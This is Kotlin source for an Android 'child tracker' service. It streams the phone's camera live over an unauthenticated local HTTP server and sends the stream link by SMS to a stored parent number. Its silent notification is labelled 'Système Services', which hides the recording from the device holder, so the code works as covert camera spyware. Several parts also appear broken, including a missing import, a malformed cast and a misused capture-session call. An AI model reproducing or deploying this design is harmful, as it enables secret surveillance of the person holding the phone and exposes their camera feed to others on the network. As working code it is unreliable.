package com.family.tracker.child

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.Service
import android.content.Context
import android.content.Intent
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.media.ImageReader
import android.os.Build
import android.os.IBinder
import android.util.Log
import android.util.Size
import androidx.core.app.NotificationCompat
import fi.iki.elonen.NanoHTTPD
import java.io.PipedInputStream
import java.io.PipedOutputStream
import java.util.concurrent.LinkedBlockingQueue
import java.util.concurrent.TimeUnit

class MJPEGServer : Service() {
    companion object {
        private const val TAG = "MJPEG"
        private const val CHANNEL_ID = "MJPEGServer"
        private const val PORT = 8080
        private const val FPS = 15 // Images par seconde = fluidité
        
        var server: MJPEGHTTPServer? = null
        var cameraDevice: CameraDevice? = null
        var imageReader: ImageReader? = null
        var isRunning = false
        var currentCamera = CameraCharacteristics.LENS_FACING_BACK
        
        val frameQueue = LinkedBlockingQueue<ByteArray>(5) // Buffer d'images
        
        const val ACTION_START = "com.family.tracker.START_MJPEG"
        const val ACTION_STOP = "com.family.tracker.STOP_MJPEG"
        const val ACTION_SWITCH = "com.family.tracker.SWITCH_MJPEG"
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        startForeground(1, buildNotification())
        Log.d(TAG, "✅ Flux vidéo MJPEG prêt")
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(CHANNEL_ID, "Flux Caméra", NotificationManager.IMPORTANCE_LOW)
            getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
                .createNotificationChannel(channel)
        }
    }

    private fun buildNotification(): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Système Services")
            .setContentText(if (isRunning) "🎥 FLUX EN DIRECT" else "En attente")
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setPriority(NotificationCompat.PRIORITY_LOW)
            .setSilent(true)
            .setOngoing(true)
            .build()
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START -> startStream()
            ACTION_STOP -> stopStream()
            ACTION_SWITCH -> switchCamera()
        }
        return START_STICKY
    }

    private fun startStream() {
        if (isRunning) return
        Log.d(TAG, "🎥 Démarrage FLUX VIDÉO...")
        
        openCamera()
        
        server = MJPEGHTTPServer()
        server!!.start(NanoHTTPD.SOCKET_READ_TIMEOUT, false)
        isRunning = true
        
        val ip = getLocalIPAddress()
        val prefs = getSharedPreferences("tracker", Context.MODE_PRIVATE)
        prefs.edit().putString("stream_url", "http://$ip:$PORT/stream.mjpeg").apply()
        
        // Envoyer l'URL par SMS au parent
        val parentNum = prefs.getString("parent", "") ?: ""
        if (parentNum.isNotEmpty()) {
            android.telephony.SmsManager.getDefault().sendTextMessage(
                parentNum, null, "✅ FLUX EN DIRECT : http://$ip:$PORT/stream.mjpeg", null, null
            )
        }
        
        Log.d(TAG, "✅ FLUX EN DIRECT : http://$ip:$PORT/stream.mjpeg")
    }

    private fun stopStream() {
        Log.d(TAG, "🛑 Arrêt du flux...")
        server?.stop()
        cameraDevice?.close()
        imageReader?.close()
        frameQueue.clear()
        server = null
        cameraDevice = null
        imageReader = null
        isRunning = false
    }

    private fun switchCamera() {
        currentCamera = if (currentCamera == CameraCharacteristics.LENS_FACING_BACK)
            CameraCharacteristics.LENS_FACING_FRONT
        else
            CameraCharacteristics.LENS_FACING_BACK
        if (isRunning) {
            stopStream()
            startStream()
        }
    }

    private fun openCamera() {
        val cm = getSystemService(Context.CAMERA_SERVICE) as CameraManager
        try {
            val cameraId = cm.cameraIdList.firstOrNull { id ->
                cm.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING) == currentCamera
            } ?: cm.cameraIdList[0]

            val size = Size(640, 480) // Résolution adaptée pour vidéo
            imageReader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 3)

            cm.openCamera(cameraId, object : CameraDevice.StateCallback() {
                override fun onOpened(cam: CameraDevice) {
                    cameraDevice = cam
                    val requestBuilder = cam.createCaptureRequest(CameraDevice.TEMPLATE_PREVIEW)
                    requestBuilder.addTarget(imageReader!!.surface)
                    requestBuilder.set(CaptureRequest.CONTROL_MODE, CaptureRequest.CONTROL_MODE_AUTO)
                    
                    cam.createCaptureSession(listOf(imageReader!!.surface), null).apply {
                        setRepeatingRequest(requestBuilder.build(), null, null)
                    }
                    
                    imageReader!!.setOnImageAvailableListener({ reader ->
                        val image = reader.acquireLatestImage() ?: return@setOnImageAvailableListener
                        val buffer = image.planes[0].buffer
                        val bytes = ByteArray(buffer.remaining())
                        buffer.get(bytes)
                        
                        // Ajouter au buffer (supprimer l'image la plus ancienne si plein)
                        if (!frameQueue.offer(bytes)) {
                            frameQueue.poll()
                            frameQueue.offer(bytes)
                        }
                        image.close()
                    }, null)
                }
                override fun onDisconnected(cam: CameraDevice) { cam.close() }
                override fun onError(cam: CameraDevice, error: Int) { cam.close() }
            }, null)
        } catch (e: Exception) {
            Log.e(TAG, "❌ Erreur caméra: ${e.message}")
        }
    }

    private fun getLocalIPAddress(): String {
        return try {
            val en = java.net.NetworkInterface.getNetworkInterfaces()
            while (en.hasMoreElements()) {
                val intf = en.nextElement()
                val enumIpAddr = intf.inetAddresses
                while (enumIpAddr.hasMoreElements()) {
                    val inetAddress = enumIpAddr.nextElement()
                    if (!inetAddress.isLoopbackAddress) {
                        val host = inetAddress.hostAddress
                        if (host != null && !host.contains(":")) return host
                    }
                }
            }
            "0.0.0.0"
        } catch (e: Exception) {
            "0.0.0.0"
        }
    }

    inner class MJPEGHTTPServer : NanoHTTPD(PORT) {
        override fun serve(session: IHTTPSession): Response {
            return when (session.uri) {
                // 🎥 PAGE WEB — comme OBS !
                "/" -> {
                    val html = """
                        <!DOCTYPE html>
                        <html>
                        <head>
                            <meta charset="utf-8">
                            <meta name="viewport" content="width=device-width, initial-scale=1.0">
                            <title>🎥 FLUX VIDÉO — Caméra à distance</title>
                            <style>
                                * { margin: 0; padding: 0; box-sizing: border-box; font-family: system-ui; }
                                body { background: #000; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
                                h1 { color: #22c55e; margin-bottom: 20px; font-size: 1.5rem; }
                                .video-container { background: #111; border-radius: 12px; padding: 10px; max-width: 800px; width: 100%; }
                                img { width: 100%; border-radius: 8px; transform: scaleX(-1); }
                                .controls { margin-top: 20px; display: flex; gap: 10px; flex-wrap: wrap; justify-content: center; }
                                button { padding: 12px 24px; border: none; border-radius: 8px; font-size: 1rem; font-weight: 600; cursor: pointer; }
                                .btn-on { background: #22c55e; color: white; }
                                .btn-off { background: #ef4444; color: white; }
                                .btn-switch { background: #3b82f6; color: white; }
                                .status { margin-top: 15px; padding: 10px 20px; background: #1a1a1a; border-radius: 8px; color: #22c55e; font-family: monospace; }
                            </style>
                        </head>
                        <body>
                            <h1>🎥 FLUX VIDÉO EN DIRECT — COMME OBS</h1>
                            <div class="video-container">
                                <img src="/stream.mjpeg" id="stream" alt="Flux vidéo">
                            </div>
                            <div class="status" id="status">✅ En attente... Ouvre l'URL pour voir le flux !</div>
                            <div class="controls">
                                <button class="btn-on" onclick="location.reload()">🔄 Rafraîchir</button>
                            </div>
                        </body>
                        </html>
                    """.trimIndent()
                    newFixedLengthResponse(Response.Status.OK, "text/html; charset=utf-8", html)
                }
                
                // 🎥 LE FLUX VIDÉO MJPEG EN DIRECT
                "/stream.mjpeg" -> {
                    val boundary = "--frame_boundary_${System.currentTimeMillis()}"
                    val stream = MJPEGInputStream(boundary)
                    return newFixedLengthResponse(Response.Status.OK, "multipart/x-mixed-replace; boundary=$boundary", stream, -1)
                }
                
                else -> newFixedLengthResponse(Response.Status.NOT_FOUND, "text/plain", "Not Found")
            }
        }
    }

    inner class MJPEGInputStream(private val boundary: String) : PipedInputStream() {
        private val output = PipedOutputStream(this)
        private var running = true

        init {
            Thread {
                try {
                    while (running && isRunning) {
                        val frame = frameQueue.poll(1000 / FPS, TimeUnit.MILLISECONDS)
                        if (frame != null) {
                            // Écrire un frame au format MJPEG
                            output.write("$boundary\r\nContent-Type: image/jpeg\r\nContent-Length: ${frame.size}\r\n\r\n".toByteArray())
                            output.write(frame)
                            output.write("\r\n".toByteArray())
                            output.flush()
                        }
                    }
                } catch (e: Exception) {
                    Log.d(TAG, "Flux terminé: ${e.message}")
                } finally {
                    output.close()
                }
            }.start()
        }

        override fun close() {
            running = false
            super.close()
        }
    }
}
